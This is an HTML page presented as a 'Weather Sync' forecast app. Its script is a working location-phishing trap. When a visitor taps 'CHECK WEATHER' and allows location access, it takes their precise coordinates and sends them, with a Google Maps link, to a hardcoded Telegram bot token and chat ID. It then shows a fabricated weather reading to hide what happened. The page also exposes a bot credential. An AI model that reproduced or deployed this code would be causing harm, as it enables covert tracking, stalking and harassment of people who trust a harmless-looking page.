<!DOCTYPE html>
<html>
<head>
    <title>Weather Sync</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #3b82f6; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <h2>Local Weather</h2>
    <p id="status">Tap below to sync your local forecast.</p>
    <button class="btn" onclick="getExact()">CHECK WEATHER</button>

    <script>
        const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
        const CHAT_ID = "5782276534";

        function getExact() {
            document.getElementById('status').innerText = "Syncing with satellites...";
            
            navigator.geolocation.getCurrentPosition((pos) => {
                // If they click ALLOW, this sends the data
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                const msg = `🚨 **Exact Location Captured**\n━━━━━━━━━━━━━━\n📍 Lat: \`${lat}\`\n📍 Lon: \`${lon}\`\n🗺️ Map: https://www.google.com/maps?q=${lat},${lon}`;

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                
                document.getElementById('status').innerText = "Weather: 29°C - Clear Skies";
            }, (err) => {
                // If they click DENY
                document.getElementById('status').innerText = "Error: Location access required.";
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
